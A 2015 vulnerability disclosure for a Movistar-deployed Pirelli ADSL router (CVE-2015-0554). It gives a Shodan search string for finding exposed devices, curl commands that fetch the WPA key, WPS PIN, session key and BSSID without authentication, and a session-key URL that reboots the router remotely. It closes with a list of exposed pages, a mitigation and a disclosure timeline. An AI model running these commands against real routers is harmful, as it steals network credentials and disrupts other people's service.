- Title:

CVE-2015-0554 ADB BroadBand Pirelli ADSL2/2+ Wireless Router P.DGA4001N  remote information disclosure 
HomeStation Movistar

- Author:

Eduardo Novella  @enovella_
ednolo[@]inf.upv[dot]es

- Version:

Tested on firmware version PDG_TEF_SP_4.06L.6


- Shodan dork : 
  + "Dropbear 0.46 country:es"  ( From now on it looks like not working on this way)


- Summary:

HomeStation movistar has deployed routers manufactured by Pirelli. These routers are vulnerable to fetch HTML code from any 
IP public over the world. Neither authentication nor any protection to avoid unauthorized extraction of sensitive information.


- The vulnerability and the way to exploit it:


$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "WLAN_"
                  <option value='0'>WLAN_DEAD</option>

$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "var wpapskkey"
var wpaPskKey = 'IsAklFHhFFui1sr9ZMqD';

$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "var WscDevPin"
var WscDevPin    = '12820078';

$ curl -s http://${IP_ADDRESS}/wlsecurity.html | grep -i "var sessionkey"
var sessionKey='1189641421';

$ curl -s http://${IP_ADDRESS}/wlcfg.html | grep -i "bssid:" -A 3
                     <td width="50">BSSID:</td>
                     <td>
                        DC:0B:1A:XX:XX:XX
                     </td>



# Rebooting the router remotely and provoking a Denial of Service
#-----------------------------------------------------------------
http://${IP_ADDRESS}/resetrouter.html

We can observe at the source:
<!-- hide

var sessionKey='846930886';
function btnReset() {
   var loc = 'rebootinfo.cgi?';

   loc += 'sessionKey=' + sessionKey;

   var code = 'location="' + loc + '"';
   eval(code);
}

// done hiding -->


http://${IP_ADDRESS}/rebootinfo.cgi?sessionKey=233665123


# All the information what we can fetch from.
#----------------------------------------------
webs$ ls
adslcfgadv.html       diagpppoe.html      ipv6lancfg.html    qoscls.html              statsatmreset.html
adslcfgc.html         dlnacfg.html        js                 qosqmgmt.html            statsifc.html
adslcfg.html          dnscfg.html         jsps               qosqueueadd.html         statsifcreset.html
adslcfgtone.html      dnsproxycfg.html    lancfg2.html       qsmain.html              statsmocalanreset.html
algcfg.html           dsladderr.html      languages          quicksetuperr.html       statsmocareset.html
APIS                  dslbondingcfg.html  lockerror.html     quicksetup.html          statsmocawanreset.html
atmdelerr.html        enblbridge.html     logconfig.html     quicksetuptesterr.html   statsvdsl.html
backupsettings.html   enblservice.html    logintro.html      quicksetuptestsucc.html  statsvdslreset.html
berrun.html           engdebug.html       logobkg.gif        rebootinfo.html          statswanreset.html
berstart.html         ethadderr.html      logoc.gif          resetrouter.html         statsxtmreset.html
berstop.html          ethdelerr.html      logo_corp.gif      restoreinfo.html         storageusraccadd.html
certadd.html          footer.html         logo.html          routeadd.html            stylemain.css
certcaimport.html     hlpadslsync.html    logomenu.gif       rtdefaultcfgerr.html     threeGPIN.html
certimport.html       hlpatmetoe.html     main.html          rtdefaultcfg.html        todadd.html
certloadsigned.html   hlpatmseg.html      menuBcm.js         scdmz.html               tr69cfg.html
cfgatm.html           hlpethconn.html     menu.html          scinflt.html             updatesettings.html
cfgeth.html           hlppngdns.html      menuTitle.js       scmacflt.html            upload.html
cfgl2tpac.html        hlppnggw.html       menuTree.js        scmacpolicy.html         uploadinfo.html
cfgmoca.html          hlppppoasess.html   mocacfg.html       scoutflt.html            upnpcfg.html
cfgptm.html           hlppppoeauth.html   multicast.html     scprttrg.html            url_add.html
colors.css            hlppppoeconn.html   natcfg2.html       scripts                  util.js
config.json.txt       hlppppoeip.html     ntwksum2.html      scvrtsrv.html            wanadderr.html
css                   hlptstdns.html      omcidownload.html  seclogintro.html         wancfg.html
ddnsadd.html          hlpusbconn.html     omcisystem.html    snmpconfig.html          wlcfgadv.html
defaultsettings.html  hlpwlconn.html      password.html      sntpcfg.html             wlcfg.html
dhcpinfo.html         html                portmapadd.html    standby.html             wlcfgkey.html
diag8021ag.html       ifcdns.html         portmapedit.html   StaticIpAdd.html         wlmacflt.html
diagbr.html           ifcgateway.html     portName.js        StaticIpErr.html         wlrefresh.html
diag.html             images              pppoe.html         statsadslerr.html        wlsecurity.html
diagipow.html         index.html          pradd.html         statsadsl.html           wlsetup.html
diaglan.html          info.html           ptmadderr.html     statsadslreset.html      wlwapias.html
diagmer.html          ipoacfg.html        ptmdelerr.html     statsatmerr.html         xdslcfg.html
diagpppoa.html        ippcfg.html         pwrmngt.html       statsatm.html



+ Conclusion:

  This vulnerability can be exploited remotely and it should be patched as soon as possible. An attacker could be monitoring our network
   or even worse being a member of a botnet without knowledge of it. 
  First mitigation could be  either try to update the last version for these routers or install 3rd parties firmwares as OpenWRT or DDWRT on them.
        


+ References:

http://packetstormsecurity.com/files/115663/Alpha-Networks-ADSL2-2-Wireless-Router-ASL-26555-Password-Disclosure.html



+ Timeline:

2013-04-xx Send email to Movistar and Pirelli
2015-01-05 Full disclosure